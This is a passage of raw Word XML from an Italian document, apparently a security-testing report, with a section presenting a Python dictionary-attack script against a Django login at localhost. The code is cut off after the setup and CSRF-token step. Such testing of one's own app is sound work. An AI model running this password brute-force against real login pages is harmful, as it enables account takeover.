          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Script per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>attacco</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dizionario</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Lo script Python </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>utilizza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ThreadPoolExecutor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">` per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tentativi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>paralleli</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>gestisce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> lock e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>evento</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di stop.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Le password </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vengono</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> testate con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>richiesta</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> POST verso il login Django, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>recuperando</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>preventivamente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> il CSRF token.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E07933" w14:paraId="535CEA2F" w14:textId="77777777" w:rsidTr="00E07933">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="650030CC" w14:textId="00AAD239" w:rsidR="00E07933" w:rsidRDefault="00E07933" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>os</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>import time</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>import sys</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>import requests</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">from bs4 import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>BeautifulSoup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">from </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>concurrent.futures</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ThreadPoolExecutor</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>import threading</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>TARGET = "http://localhost:8000"</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>LOGIN_URL = TARGET + "/login/"</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>EMAIL = input("Email account di test: ")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">BASE_DIR = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>os.path.dirname</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>os.path.abspath</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(__file__))</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">DIZIONARIO_PATH = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>os.path.join</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(BASE_DIR, "dizionario.txt")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">lock = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>threading.Lock</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>stop_event</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>threading.Event</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">session = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>requests.Session</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>()</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">def </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>get_csrf_token</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>():</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    try:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        r = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>session.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(LOGIN_URL, timeout=10)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    except </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>requests.exceptions.RequestException</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        print("</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Errore</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>impossibile</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>collegarsi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> al </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>sito</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>.")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>sys.exit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(1)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    soup = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>BeautifulSoup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>r.text</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, "</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>html.parser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    token = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>soup.find</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>("input", {"name": "</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>csrfmiddlewaretoken</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"})</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    if not token:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        print("</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Errore</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>: token CSRF non trovato.")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>sys.exit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(1)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    return token["value"]</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>csrf_token</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
